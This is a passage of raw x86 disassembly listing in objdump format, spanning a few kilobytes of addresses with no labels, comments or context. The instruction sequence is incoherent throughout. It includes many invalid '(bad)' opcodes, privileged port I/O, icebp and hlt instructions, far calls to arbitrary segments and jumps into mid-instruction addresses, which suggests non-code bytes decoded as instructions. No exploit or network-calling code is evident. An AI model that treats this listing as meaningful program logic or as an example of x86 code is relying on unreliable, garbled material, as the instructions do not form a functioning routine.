  4029ea:	xor    BYTE PTR [ecx+ebx*8-0x3d0c2db3],dh
  4029f1:	push   0x165b0e30
  4029f6:	icebp  
  4029f7:	dec    eax
  4029f8:	pop    es
  4029f9:	fs inc ebx
  4029fb:	std    
  4029fc:	push   ebx
  4029fd:	test   al,0x36
  4029ff:	sbb    eax,0xb3be784f
  402a04:	xor    bh,BYTE PTR [ecx]
  402a06:	xor    ch,0x85
  402a09:	xor    DWORD PTR ss:[ebx+0x5ca33a49],esi
  402a10:	fstp   st(6)
  402a12:	mov    edx,0x9aba9c0e
  402a17:	in     al,0x2d
  402a19:	jb     0x4029a1
  402a1b:	ror    BYTE PTR [ebx+0x59],cl
  402a1e:	scas   eax,DWORD PTR es:[di]
  402a20:	aaa    
  402a21:	mov    ebx,0x8efd43f2
  402a26:	test   BYTE PTR [esp+edx*1],dl
  402a29:	cdq    
  402a2a:	mov    sp,0xfb4f
  402a2e:	ins    DWORD PTR es:[edi],dx
  402a2f:	and    bl,BYTE PTR [esi+0x1d]
  402a32:	lods   eax,DWORD PTR ds:[esi]
  402a33:	push   esi
  402a34:	add    eax,eax
  402a36:	adc    DWORD PTR [ebp+0x232e808f],esi
  402a3c:	and    ah,ch
  402a3e:	xchg   esi,eax
  402a3f:	or     bl,ch
  402a41:	add    esi,edi
  402a43:	not    DWORD PTR [edi]
  402a45:	out    dx,al
  402a46:	push   eax
  402a47:	(bad)  
  402a48:	adc    al,0x3b
  402a4a:	or     BYTE PTR [ebx+0x7229f3ef],bh
  402a50:	pop    ss
  402a51:	addr16 int3 
  402a53:	push   ss
  402a54:	lods   al,BYTE PTR ds:[esi]
  402a55:	jno    0x4029da
  402a57:	test   BYTE PTR [ebx-0x5f],ah
  402a5a:	icebp  
  402a5b:	pop    eax
  402a5c:	dec    edx
  402a5d:	and    dl,al
  402a5f:	jl     0x402ab2
  402a61:	imul   esi,DWORD PTR [esi+0x3df2d8be],0x831f91b7
  402a6b:	or     BYTE PTR [eax+edx*4+0x23],al
  402a6f:	cmc    
  402a70:	add    BYTE PTR [ecx],bh
  402a72:	adc    edi,edi
  402a74:	dec    ebx
  402a75:	sbb    eax,ecx
  402a77:	inc    eax
  402a78:	cmp    ch,ah
  402a7a:	cmp    esi,ebx
  402a7c:	mov    edi,0x53dc5317
  402a81:	cld    
  402a82:	ja     0x402ab2
  402a84:	div    DWORD PTR [ecx]
  402a86:	fs dec esi
  402a88:	sbb    ch,ah
  402a8a:	leave  
  402a8b:	into   
  402a8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a8d:	test   BYTE PTR [ecx],ah
  402a8f:	icebp  
  402a90:	jge    0x402a2d
  402a92:	mov    BYTE PTR [ebp-0x7f],dl
  402a95:	mov    ah,0x3f
  402a97:	pop    ebp
  402a98:	gs in  al,0x5d
  402a9b:	cmc    
  402a9c:	jge    0x402a5d
  402a9e:	jne    0x402aff
  402aa0:	mov    dh,BYTE PTR [esi+0x57]
  402aa3:	sti    
  402aa4:	mov    es,WORD PTR [esi]
  402aa6:	and    cl,bl
  402aa8:	iret   
  402aa9:	scas   eax,DWORD PTR es:[edi]
  402aaa:	test   al,0xd2
  402aac:	fldenv [edx-0x56fb2762]
  402ab2:	nop
  402ab3:	or     eax,0xd8ca1204
  402ab8:	mov    edi,0x4742d210
  402abd:	add    eax,0x621d1af5
  402ac2:	mov    ebx,DWORD PTR [edi]
  402ac4:	ins    BYTE PTR es:[edi],dx
  402ac5:	push   0x37e5d9d0
  402aca:	and    dl,BYTE PTR [esi+0x60343317]
  402ad0:	pop    ss
  402ad1:	ins    BYTE PTR es:[edi],dx
  402ad2:	cmp    al,0xc4
  402ad4:	or     al,0x21
  402ad6:	fidiv  WORD PTR [edi+0x132b7b37]
  402adc:	dec    esp
  402add:	xchg   edi,eax
  402ade:	mov    edi,0x450a65d
  402ae3:	sub    BYTE PTR [edx],cl
  402ae5:	or     al,0x2d
  402ae7:	ja     0x402ae1
  402ae9:	div    BYTE PTR [ebp-0x44]
  402aec:	int    0x7e
  402aee:	jnp    0x4dfd2f21
  402af4:	push   ecx
  402af5:	data16 shl dh,1
  402af8:	or     al,0x1
  402afa:	mov    edx,0x2b5a84e5
  402aff:	lds    eax,FWORD PTR [edi]
  402b01:	mov    ebx,0xc52bde5d
  402b06:	cmp    al,0xd7
  402b08:	mov    ebx,0x19e8b41e
  402b0d:	push   0x5f5d68fa
  402b12:	jbe    0x402aeb
  402b14:	das    
  402b15:	xchg   BYTE PTR [edi],dl
  402b17:	inc    ebp
  402b18:	test   al,0xf3
  402b1a:	mov    bx,0x1d67
  402b1e:	and    al,BYTE PTR [ebp-0x52e85bc7]
  402b24:	mov    cl,0x35
  402b26:	inc    esp
  402b27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402b28:	pmulhw mm1,QWORD PTR [ebp+0x78]
  402b2c:	mov    bl,0x29
  402b2e:	iret   
  402b2f:	mov    edi,0x97521bbc
  402b34:	in     eax,0xd0
  402b36:	pop    ss
  402b37:	test   eax,0x7bfc950d
  402b3c:	lods   eax,DWORD PTR ds:[esi]
  402b3d:	jecxz  0x402acf
  402b3f:	jp     0x402b36
  402b41:	dec    ebp
  402b42:	js     0x402ad2
  402b44:	dec    ecx
  402b45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402b46:	int    0x3f
  402b48:	loopne 0x402af1
  402b4a:	jo     0x402b3e
  402b4c:	daa    
  402b4d:	outs   dx,BYTE PTR ds:[esi]
  402b4e:	in     eax,0x8e
  402b50:	sub    cl,cl
  402b52:	int    0xea
  402b54:	inc    ebp
  402b55:	addr16 sti 
  402b57:	mov    al,ch
  402b59:	mov    al,ah
  402b5b:	stos   DWORD PTR es:[edi],eax
  402b5c:	pcmpgtb mm5,QWORD PTR [esi+0x773824]
  402b63:	adc    eax,0x2d716dee
  402b68:	inc    ecx
  402b69:	ror    DWORD PTR [eax-0x29],1
  402b6c:	lods   eax,DWORD PTR ds:[esi]
  402b6d:	test   al,0x2f
  402b6f:	retf   
  402b70:	add    BYTE PTR [eax],ch
  402b72:	inc    ebx
  402b73:	dec    ebp
  402b74:	inc    ecx
  402b75:	(bad)  
  402b76:	mov    ebp,0x9df47046
  402b7b:	sub    al,ch
  402b7d:	rol    BYTE PTR [ecx-0x28d20100],cl
  402b83:	ret    
  402b84:	ror    DWORD PTR [ebx],0x4a
  402b87:	dec    eax
  402b88:	xchg   ebx,eax
  402b89:	xchg   BYTE PTR [ecx],al
  402b8b:	xchg   ecx,eax
  402b8c:	jnp    0x402b57
  402b8e:	mov    bl,0x6b
  402b90:	xor    cl,0x7d
  402b93:	jg     0x402c11
  402b95:	(bad)  
  402b96:	ret    0x937e
  402b99:	sbb    eax,0xa22909a5
  402b9e:	xchg   esi,eax
  402b9f:	imul   DWORD PTR [esi]
  402ba1:	or     DWORD PTR [eax-0x32],esp
  402ba4:	retf   0xa210
  402ba7:	shl    DWORD PTR [ebx],cl
  402ba9:	or     esp,ecx
  402bab:	loope  0x402bd1
  402bad:	or     ebx,DWORD PTR [edx+ebx*4]
  402bb0:	dec    ebx
  402bb1:	out    dx,al
  402bb2:	sub    al,0x20
  402bb4:	cmp    esi,ecx
  402bb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402bb7:	out    dx,al
  402bb8:	adc    ah,bh
  402bba:	sbb    BYTE PTR [ebp-0x413b182c],dh
  402bc0:	enter  0x6aa0,0x28
  402bc4:	js     0x402b6d
  402bc6:	and    al,0x4e
  402bc8:	mov    bh,0xad
  402bca:	mov    ds:0x171f820f,eax
  402bcf:	mov    DWORD PTR [esi],edx
  402bd1:	lock push edx
  402bd3:	out    dx,al
  402bd4:	inc    esp
  402bd5:	add    eax,0xc9a592e3
  402bda:	xchg   esp,eax
  402bdb:	sahf   
  402bdc:	xchg   BYTE PTR [ebx+0x28b77994],ah
  402be2:	inc    si
  402be4:	sbb    esp,eax
  402be6:	rcr    BYTE PTR [edx+0x3],1
  402be9:	pop    eax
  402bea:	fstp   QWORD PTR [ecx-0xd]
  402bed:	rcl    al,cl
  402bef:	inc    ecx
  402bf0:	xchg   edi,eax
  402bf1:	jl     0x402c37
  402bf3:	pop    ecx
  402bf4:	mov    bh,0x40
  402bf6:	mov    al,cs:0x7ab6a302
  402bfc:	sar    DWORD PTR [eiz*1+0x252cc23e],1
  402c03:	mov    WORD PTR [edi-0x1a2d4ccd],ss
  402c09:	mov    eax,0x69c9108
  402c0e:	or     DWORD PTR [edi-0x40302b69],0x9c4e852b
  402c18:	xchg   esi,eax
  402c19:	(bad)  
  402c1a:	stc    
  402c1b:	push   cs
  402c1c:	test   eax,0xc39f0ce6
  402c21:	sub    esp,DWORD PTR [esi+0x3e55a241]
  402c27:	adc    DWORD PTR [edi-0x25],eax
  402c2a:	sbb    eax,edi
  402c2c:	inc    esi
  402c2d:	push   ds
  402c2e:	stos   DWORD PTR es:[edi],eax
  402c2f:	dec    ebp
  402c30:	clc    
  402c31:	push   ebp
  402c32:	cmp    esp,DWORD PTR [edx-0x57]
  402c35:	push   edx
  402c36:	fidiv  WORD PTR [edx+0x7a]
  402c39:	jp     0x402bbf
  402c3b:	call   0xf5a6:0x7deb6601
  402c42:	gs test al,0xb7
  402c45:	aas    
  402c46:	cmp    dl,ah
  402c48:	sbb    eax,0x57654a80
  402c4d:	adc    DWORD PTR [ebp+0x6e222866],0xbe13105e
  402c57:	mov    ecx,0x21b57e98
  402c5c:	popa   
  402c5d:	int3   
  402c5e:	dec    eax
  402c5f:	sbb    esp,DWORD PTR [ebx]
  402c61:	jbe    0x402cbf
  402c63:	div    edi
  402c65:	pop    edx
  402c66:	data16 shl BYTE PTR [eax+0x27],0xdf
  402c6b:	or     esi,DWORD PTR [ebx-0x56]
  402c6e:	loope  0x402c7b
  402c70:	jbe    0x402cdc
  402c72:	hlt    
  402c73:	dec    edx
  402c74:	xor    ah,BYTE PTR [edx-0x6d4fb8cb]
  402c7a:	jne    0x402c54
  402c7c:	jae    0x402c22
  402c7e:	sub    BYTE PTR [edx+0x5a070a60],0x66
  402c85:	mov    ebp,0xcac28e9
  402c8a:	inc    ecx
  402c8b:	or     esi,edi
  402c8d:	cmp    BYTE PTR [edx-0x6736c469],bl
  402c93:	jne    0x402c42
  402c95:	cmc    
  402c96:	dec    esi
  402c97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402c98:	adc    eax,0x48567b87
  402c9d:	adc    ah,BYTE PTR [ecx]
  402c9f:	and    al,0xe3
  402ca1:	xlat   BYTE PTR ds:[ebx]
  402ca2:	mov    ecx,0xb68c1018
  402ca7:	std    
  402ca8:	imul   BYTE PTR [edi-0x64ddd802]
  402cae:	das    
  402caf:	push   0x316c9e99
  402cb4:	xor    al,0xf5
  402cb6:	mov    bl,0xb2
  402cb8:	mov    ds:0x4d6e9540,eax
  402cbd:	cmp    BYTE PTR [edx-0x6b],al
  402cc0:	push   edi
  402cc1:	outs   dx,BYTE PTR ds:[esi]
  402cc2:	outs   dx,BYTE PTR ds:[esi]
  402cc3:	push   cs
  402cc4:	mov    ds:0x2dd0c514,al
  402cc9:	loope  0x402c6e
  402ccb:	ins    DWORD PTR es:[edi],dx
  402ccc:	cdq    
  402ccd:	aas    
  402cce:	and    DWORD PTR [esi-0x46],0x5c18a13f
  402cd5:	out    dx,eax
  402cd6:	shl    DWORD PTR ds:0x958012fd,cl
  402cdc:	dec    ecx
  402cdd:	xor    esp,DWORD PTR [esi+0x5499263a]
  402ce3:	stos   BYTE PTR es:[edi],al
  402ce4:	lds    cx,DWORD PTR ds:0x9415d86f
  402ceb:	lods   eax,DWORD PTR ds:[esi]
  402cec:	jbe    0x402c92
  402cee:	push   0x75c97d59
  402cf3:	lock mov ds:0x760257e3,al
  402cf9:	out    0x50,al
  402cfb:	cdq    
  402cfc:	push   ss
  402cfd:	(bad)  
  402cfe:	xchg   edx,eax
  402cff:	xor    BYTE PTR [ebp+0x34],cl
  402d02:	xchg   esi,eax
  402d03:	jb     0x402d61
  402d05:	in     al,dx
  402d06:	mov    dl,0xd9
  402d08:	lock push ebx
  402d0a:	sub    eax,0xc92589ce
  402d0f:	xlat   BYTE PTR ds:[ebx]
  402d10:	(bad)  
  402d11:	or     al,0xed
  402d13:	repz fist DWORD PTR [ebx]
  402d16:	adc    edi,DWORD PTR [edi+0x71e943a2]
  402d1c:	(bad)  
  402d1d:	shl    DWORD PTR [ebp-0x23],cl
  402d20:	bound  esi,QWORD PTR [bx]
  402d23:	loop   0x402d81
  402d25:	aam    0xca
  402d27:	sbb    ah,BYTE PTR [edi]
  402d29:	mov    ch,0xe5
  402d2b:	push   es
  402d2c:	sahf   
  402d2d:	or     al,0x7c
  402d2f:	push   esi
  402d30:	lea    esi,[edx+0x56a4fd63]
  402d36:	mov    ds:0x3d086f54,eax
  402d3b:	inc    ecx
  402d3c:	test   al,0x4d
  402d3e:	add    al,0x13
  402d40:	int    0xdf
  402d42:	iret   
  402d43:	bound  eax,QWORD PTR [edx-0x79737c0c]
  402d49:	pop    esp
  402d4a:	(bad)  
  402d4b:	imul   esi,DWORD PTR [eax-0x47fa4984],0xcef4dea5
  402d55:	gs test eax,0x9abd6cc2
  402d5b:	in     eax,0x84
  402d5d:	or     eax,0xbac8acee
  402d62:	jge    0x402d45
  402d64:	repz in eax,0xe5
  402d67:	aad    0x49
  402d69:	adc    cl,ch
  402d6b:	mov    WORD PTR [edi-0x3d3118ee],?
  402d71:	and    ebp,DWORD PTR [ebx*8-0x4772669c]
  402d78:	add    al,0x44
  402d7a:	cwde   
  402d7b:	sub    esi,DWORD PTR [edi]
  402d7d:	sub    ecx,esi
  402d7f:	(bad)  
  402d81:	jno    0x402d95
  402d83:	xor    ch,BYTE PTR [esp+ebp*2-0xb]
  402d87:	ins    BYTE PTR es:[edi],dx
  402d88:	test   DWORD PTR [edx-0x16fe7cb7],edi
  402d8e:	call   0xa743b4cb
  402d93:	iret   
  402d94:	ror    DWORD PTR [edx-0x67],1
  402d97:	(bad)  
  402d98:	test   eax,0x673e388c
  402d9d:	test   DWORD PTR [eax+0x28],0xb9035add
  402da4:	(bad)  
  402da5:	in     al,dx
  402da6:	inc    edx
  402da7:	fucom  st(0)
  402da9:	add    BYTE PTR [ecx],dl
  402dab:	dec    ebx
  402dac:	pusha  
  402dad:	mov    esp,0x602a4748
  402db2:	cwde   
  402db3:	xchg   edx,eax
  402db4:	ret    
  402db5:	sbb    dl,BYTE PTR [ecx]
  402db7:	xchg   esp,eax
  402db8:	pop    ss
  402db9:	mov    edi,0x306ffc79
  402dbe:	bound  edi,QWORD PTR ds:0x742b9ca2
  402dc4:	sub    bl,BYTE PTR ds:0x523527b9
  402dca:	dec    ecx
  402dcb:	jp     0x402d9c
  402dcd:	lods   eax,DWORD PTR ds:[esi]
  402dce:	int    0x6c
  402dd0:	adc    ecx,DWORD PTR [edx+0x366d0409]
  402dd6:	call   0xdacc6941
  402ddb:	xor    al,0x9b
  402ddd:	xlat   BYTE PTR ds:[ebx]
  402dde:	xor    al,0x20
  402de0:	inc    ebx
  402de1:	sbb    al,0xcf
  402de3:	mov    eax,0xbb0b469a
  402de8:	mul    esp
  402dea:	jne    0x402e3a
  402dec:	loop   0x402da8
  402dee:	aam    0x1
  402df0:	jmp    0xa2d16fd9
  402df5:	adc    BYTE PTR [ecx+0x59],bl
  402df8:	pop    es
  402df9:	jg     0x402dfa
  402dfb:	stos   DWORD PTR es:[edi],eax
  402dfc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402dfd:	lahf   
  402dfe:	les    ebp,FWORD PTR [ebp+0x78b086b7]
  402e04:	and    al,0xcc
  402e06:	cmp    edi,DWORD PTR [edi-0x250549d8]
  402e0c:	jbe    0x402db1
  402e0e:	xchg   esp,eax
  402e0f:	push   edi
  402e10:	sbb    DWORD PTR [esi],edx
  402e12:	outs   dx,DWORD PTR ds:[esi]
  402e13:	dec    ebp
  402e14:	xor    DWORD PTR [ecx-0x1ace07c7],esp
  402e1a:	mov    WORD PTR [esi],fs
  402e1c:	jbe    0x402e45
  402e1e:	das    
  402e1f:	test   al,0x0
  402e21:	in     al,0xef
  402e23:	mov    bh,0xec
  402e25:	dec    ebp
  402e26:	pushf  
  402e27:	or     al,0x47
  402e29:	test   eax,0x63dbc4f3
  402e2e:	pop    edi
  402e2f:	and    ch,BYTE PTR [esi*1+0x63184810]
  402e36:	jle    0x402e01
  402e38:	test   BYTE PTR [ecx-0x13706a8a],cl
  402e3e:	push   edi
  402e3f:	out    0x30,al
  402e41:	xchg   ebp,eax
  402e42:	mov    ds:0x9cd67e6,eax
  402e47:	jmp    0x97f8:0x1803dc8d
  402e4e:	inc    ecx
  402e4f:	inc    edi
  402e50:	dec    edx
  402e51:	mov    eax,0x1e43a83
  402e56:	rcl    DWORD PTR [edi],1
  402e58:	push   ss
  402e59:	or     eax,0x112b2cf1
  402e5e:	out    dx,al
  402e5f:	fild   DWORD PTR [esi+0x36]
  402e62:	mov    WORD PTR [ecx-0x7e],gs
  402e65:	mov    dh,0xd5
  402e67:	jecxz  0x402ec8
  402e69:	jge    0x402e6f
  402e6b:	into   
  402e6c:	repz sbb BYTE PTR [edx+0x79eef6ee],bl
  402e73:	loopne 0x402e4a
  402e75:	iret   
  402e76:	ja     0x402ea9
  402e78:	mov    dh,0xaf
  402e7a:	pop    eax
  402e7b:	aad    0x70
  402e7d:	add    al,0xfb
  402e7f:	shl    BYTE PTR [edi+0x28],cl
  402e82:	test   al,0x4c
  402e84:	sbb    DWORD PTR [esp+ebx*2-0x70c28e4a],ebx
  402e8b:	add    dl,dh
  402e8d:	daa    
  402e8e:	test   eax,esi
  402e90:	or     BYTE PTR cs:[ebx-0x23],ch
  402e94:	in     eax,0x9b
  402e96:	pop    ebx
  402e97:	in     eax,0xdc
  402e99:	bound  ecx,QWORD PTR [ebx+0x1b8a80e7]
  402e9f:	popa   
  402ea0:	sub    eax,0xdedab485
  402ea5:	addr16 mov bh,0xc0
  402ea8:	sub    BYTE PTR [esi],dh
  402eaa:	and    cl,BYTE PTR [ebp+0x243484d5]
  402eb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402eb1:	or     ebp,eax
  402eb3:	xor    WORD PTR [ecx-0x46],dx
  402eb7:	call   0x9f65:0x128f7d2b
  402ebe:	push   ecx
  402ebf:	fwait
  402ec0:	sub    al,0x39
  402ec2:	ins    DWORD PTR es:[edi],dx
  402ec3:	and    ebx,DWORD PTR [ebx+ebx*4]
  402ec6:	cld    
  402ec7:	jmp    0x402f00
  402ec9:	sub    ch,BYTE PTR ds:0x36ef2287
  402ecf:	sti    
  402ed0:	add    BYTE PTR [ecx+eiz*2+0x39f82bd],ah
  402ed7:	test   al,0x69
  402ed9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402eda:	dec    edx
  402edb:	jg     0x402f12
  402edd:	icebp  
  402ede:	in     al,dx
  402edf:	adc    BYTE PTR [esi-0x27608488],0xa9
  402ee6:	sahf   
  402ee7:	test   al,0x9a
  402ee9:	jae    0x402e8d
  402eeb:	sub    cl,BYTE PTR [ebp-0x65]
  402eee:	add    BYTE PTR [ecx],dl
  402ef0:	inc    ecx
  402ef1:	mov    ebp,0x829d374
  402ef6:	xchg   ecx,eax
  402ef7:	stc    
  402ef8:	xor    ah,BYTE PTR cs:0xda9beb0e
  402eff:	je     0x402f6a
  402f01:	shl    BYTE PTR [edx],1
  402f03:	retf   0xb7af
  402f06:	mov    dl,0x3
  402f08:	inc    esp
  402f09:	cmp    al,0x47
  402f0b:	sahf   
  402f0c:	push   esp
  402f0d:	sti    
  402f0e:	lods   eax,DWORD PTR ds:[esi]
  402f0f:	out    dx,eax
  402f10:	jg     0x402f29
  402f12:	das    
  402f13:	jbe    0x402e95
  402f15:	or     al,0x4a
  402f17:	sub    eax,0x9f3550ee
  402f1c:	repnz test ebp,edi
  402f1f:	lea    edi,[eax-0x2]
  402f22:	shl    edx,1
  402f24:	mov    ds:0x138b79bb,al
  402f29:	dec    edi
  402f2a:	sub    ah,BYTE PTR [eax+0x61a3431]
  402f30:	and    BYTE PTR [ebx+0x17],dl
  402f33:	leave  
  402f34:	hlt    
  402f35:	mov    ch,0x3b
  402f37:	pusha  
  402f38:	adc    BYTE PTR [edx],cl
  402f3a:	xor    eax,ebp
  402f3c:	fiadd  WORD PTR [edi+0x1d]
  402f3f:	call   0xaf4f:0xfa85c409
  402f46:	or     al,0x53
  402f48:	and    BYTE PTR [edi],bh
  402f4a:	sbb    al,0x66
  402f4c:	and    eax,0x1be89af6
  402f51:	aam    0xf9
  402f53:	sbb    esp,DWORD PTR [edi]
  402f55:	int    0x1b
  402f57:	jnp    0x402f06
  402f59:	add    BYTE PTR [edi-0x60],ah
  402f5c:	xchg   BYTE PTR [ecx],bl
  402f5e:	cwde   
  402f5f:	jns    0x402f29
  402f61:	test   eax,0x45d77962
  402f66:	loop   0x402f68
  402f68:	rol    BYTE PTR [esi],1
  402f6a:	repz jb 0x402f2d
  402f6d:	sub    dh,BYTE PTR [ecx+0x77]
  402f70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402f71:	fwait
  402f72:	mov    cl,0xc4
  402f74:	cld    
  402f75:	push   ebp
  402f76:	fistp  WORD PTR [eax]
  402f78:	ins    BYTE PTR es:[edi],dx
  402f79:	sar    BYTE PTR [esi],1
  402f7b:	(bad)  
  402f7c:	jo     0x402f42
  402f7e:	or     DWORD PTR [eax-0x3a],ebp
  402f81:	add    bh,0xd
  402f84:	repnz add DWORD PTR [eax+0x5d44c670],ecx
  402f8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f8c:	lock jge 0x402f8f
  402f8f:	test   al,0x5a
  402f91:	enter  0xbc7d,0x33
  402f95:	fsubr  QWORD PTR [esi-0x74eae21]
  402f9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f9c:	jne    0x402f91
  402f9e:	fmulp  st(5),st
  402fa0:	sbb    al,0xe2
  402fa2:	cs leave 
  402fa4:	rcl    DWORD PTR [edi+edx*8-0x51],cl
  402fa8:	fild   DWORD PTR [esi-0x78]
  402fab:	mov    ch,BYTE PTR [ebp-0x3907d603]
  402fb1:	mov    bl,ch
  402fb3:	loope  0x402ff5
  402fb5:	imul   DWORD PTR [edx-0x31d4c343]
  402fbb:	sub    esp,ebx
  402fbd:	xor    edx,DWORD PTR [edx+0x5cc18897]
  402fc3:	mov    WORD PTR [edi-0xa],cs
  402fc6:	pop    edi
  402fc7:	adc    al,bl
  402fc9:	popf   
  402fca:	xchg   esi,eax
  402fcb:	lds    edx,FWORD PTR [ecx-0xc]
  402fce:	pop    eax
  402fcf:	pop    es
  402fd0:	dec    ecx
  402fd1:	xor    bl,BYTE PTR [ebx+0x1e4883e]
  402fd7:	(bad)  
  402fd8:	rcl    DWORD PTR [edi+0x76],cl
  402fdb:	test   al,bl
  402fdd:	mov    dl,0xcd
  402fdf:	ds into 
  402fe1:	jge    0x403019
  402fe3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402fe4:	pop    DWORD PTR [esi-0x12a67a22]
  402fea:	les    esi,FWORD PTR [edx-0x5b]
  402fed:	test   BYTE PTR [edx+0x57],0xa7
  402ff1:	aas    
  402ff2:	and    ebp,DWORD PTR [edi-0x7bd4d0ca]
  402ff8:	cs mov bh,0x3a
  402ffb:	int3   
  402ffc:	div    BYTE PTR [edi+0x5e8898b9]
  403002:	pop    edx
  403003:	stos   DWORD PTR es:[edi],eax
  403004:	mov    bh,0x4e
  403006:	or     DWORD PTR [ebx+0x32],0xffffffdf
  40300a:	pop    es
  40300b:	into   
  40300c:	adc    eax,0x7e94440e
  403011:	jae    0x402f9c
  403013:	daa    
  403014:	(bad)  
  403015:	in     al,dx
  403016:	inc    ebx
  403017:	adc    dl,BYTE PTR [eax+0x2a1015ca]
  40301d:	int    0xdb
  40301f:	cmp    al,0x2e
  403021:	and    DWORD PTR [eax+0x527b7f8a],ebp
  403027:	shl    DWORD PTR [esi+0x6d],cl
  40302a:	xchg   ecx,eax
  40302b:	mov    eax,DWORD PTR [eax-0x1d3fce49]
  403031:	xor    eax,0x7139e972
  403036:	mov    ds:0x7a1a6cda,al
  40303b:	imul   ebp,DWORD PTR [esi],0x6bd06d9
  403041:	cmp    eax,ebp
  403043:	inc    ebp
  403044:	popa   
  403045:	adc    BYTE PTR es:0x4e635dd7,dh
  40304c:	mov    esp,ds
  40304e:	push   esp
  40304f:	jb     0x403056
  403051:	or     dh,ch
  403053:	(bad)
  403056:	addr16 je 0x4030b9
  403059:	lock sbb ah,al
  40305c:	mov    esp,0x83576c91
  403061:	ret    0xf886
  403064:	jge    0x40301f
  403066:	xchg   edx,eax
  403067:	leave  
  403068:	cmp    DWORD PTR [eax-0x238e732],0xffffffd2
  40306f:	ret    
  403070:	jp     0x40306b
  403072:	push   ebp
  403073:	jb     0x402ff7
  403075:	fmul   st,st(6)
  403077:	push   eax
  403078:	fmulp  st(4),st
  40307a:	adc    DWORD PTR ds:0xb0702063,0x7e
  403081:	ret    0xaab3
  403084:	in     al,dx
  403085:	test   eax,0x15feeecc
  40308a:	pop    eax
  40308b:	mov    al,ds:0xcfac19a
  403090:	mov    ah,0x64
  403092:	fs xchg edx,eax
  403094:	sub    al,0x50
  403096:	push   es
  403097:	imul   BYTE PTR [ebx-0x64b5dd5]
  40309d:	out    0x8e,eax
  40309f:	mov    eax,0x5614375
  4030a4:	or     DWORD PTR [ebx],edi
  4030a6:	bound  ecx,QWORD PTR [esi]
  4030a8:	ss inc edx
  4030aa:	jns    0x4030d3
  4030ac:	mov    ch,0x66
  4030ae:	push   ebp
  4030af:	fadd   DWORD PTR [edx+esi*1-0x41a2f39d]
  4030b6:	mov    eax,ds:0xf6f1a11
  4030bb:	ret    
  4030bc:	cld    
  4030bd:	sub    esi,DWORD PTR [edx+0x603ac120]
  4030c3:	fmul   QWORD PTR [edi-0x2b9be211]
  4030c9:	xchg   ebx,eax
  4030ca:	fcmovb st,st(1)
  4030cc:	arpl   WORD PTR [eax+edi*4+0x3b],si
  4030d0:	imul   ebp,DWORD PTR [ebx+0x19],0x1c
  4030d4:	je     0x4030ed
  4030d6:	cli    
  4030d7:	(bad)  
  4030d8:	push   ecx
  4030d9:	loope  0x4030d0
  4030db:	sub    al,0xb0
  4030dd:	mov    bh,0xa3
  4030df:	popa   
  4030e0:	nop
  4030e1:	inc    edi
  4030e2:	test   eax,0xa0d8c694
  4030e7:	adc    eax,0x96cbe33c
  4030ec:	popa   
  4030ed:	and    BYTE PTR [esi+0x29],ah
  4030f0:	push   eax
  4030f1:	add    al,0x3c
  4030f3:	aad    0xe2
  4030f5:	dec    ecx
  4030f6:	aas    
  4030f7:	test   DWORD PTR [edx-0x2c],ecx
  4030fa:	xchg   esi,eax
  4030fb:	mov    edi,eax
  4030fd:	pop    ebp
  4030fe:	mov    edx,0xaa0a00d6
  403103:	stc    
  403104:	in     eax,0xab
  403106:	xchg   ebx,eax
  403107:	fucomi st,st(1)
  403109:	cmp    eax,ebx
  40310b:	mov    eax,0x9571bcf7
  403110:	not    BYTE PTR [eax+0x2ac321a5]
  403116:	cmp    cl,BYTE PTR [edx]
  403118:	sub    bl,BYTE PTR ds:0xfac19392
  40311e:	adc    BYTE PTR [ecx+0x4b],bh
  403121:	test   BYTE PTR [edi],ch
  403123:	adc    edi,DWORD PTR [ebx-0x49]
  403126:	inc    esp
  403127:	loope  0x40319f
  403129:	xchg   esp,eax
  40312a:	dec    edi
  40312b:	int3   
  40312c:	adc    eax,0x78c36e06
  403131:	lock jno 0x40317e
  403134:	xchg   DWORD PTR [edx-0xbbae20f],ebx
  40313a:	cmc    
  40313b:	daa    
  40313c:	bound  eax,QWORD PTR [edx]
  40313e:	or     al,BYTE PTR [ebp+0x3a4d45e]
  403144:	cmp    eax,DWORD PTR [edx-0xa]
  403147:	dec    esi
  403148:	loope  0x40313c
  40314a:	or     al,0x8e
  40314c:	inc    eax
  40314d:	ret    
  40314e:	nop
  40314f:	icebp  
  403150:	in     eax,dx
  403151:	dec    eax
  403152:	popf   
  403153:	add    DWORD PTR [edx-0x10],0x9aea278b
  40315a:	lea    eax,[eax+0x54]
  40315d:	cli    
  40315e:	dec    esi
  40315f:	cs nop
  403161:	xchg   ebx,eax
  403162:	add    eax,0x59c3e7fb
  403167:	or     edx,DWORD PTR [ecx-0x6c]
  40316a:	dec    eax
  40316b:	mov    al,0x3d
  40316d:	and    DWORD PTR [esi-0x5c475b43],ebp
  403173:	sub    ch,BYTE PTR [edx+0x4f4cd58f]
  403179:	cmp    bl,BYTE PTR [edx+0x61e9e2e]
  40317f:	adc    eax,0xcca040f2
  403184:	push   esi
  403185:	pop    ss
  403186:	ror    BYTE PTR [edx+0x7d],0x7e
  40318a:	add    DWORD PTR [ebx-0xd],ebx
  40318d:	scas   eax,DWORD PTR es:[edi]
  40318e:	leave  
  40318f:	push   0x31c64bdb
  403194:	in     eax,dx
  403195:	fnstcw WORD PTR [ebx]
  403197:	adc    al,0x7b
  403199:	mov    ch,0x8c
  40319b:	scas   eax,DWORD PTR es:[edi]
  40319c:	xchg   DWORD PTR [esp+eax*4-0x73c9be6a],edx
  4031a3:	push   ds
  4031a4:	pop    ds
  4031a5:	mov    esi,0xf6cd99a1
  4031aa:	lds    ebx,FWORD PTR [ebp+0x4]
  4031ad:	fs cli 
  4031af:	sub    DWORD PTR [ebx+0x7a],edi
  4031b2:	rol    bl,1
  4031b4:	push   ss
  4031b5:	mov    cl,0xb9
  4031b7:	test   al,0x18
  4031b9:	imul   eax,ebx,0xf46f9fc6
  4031bf:	in     al,dx
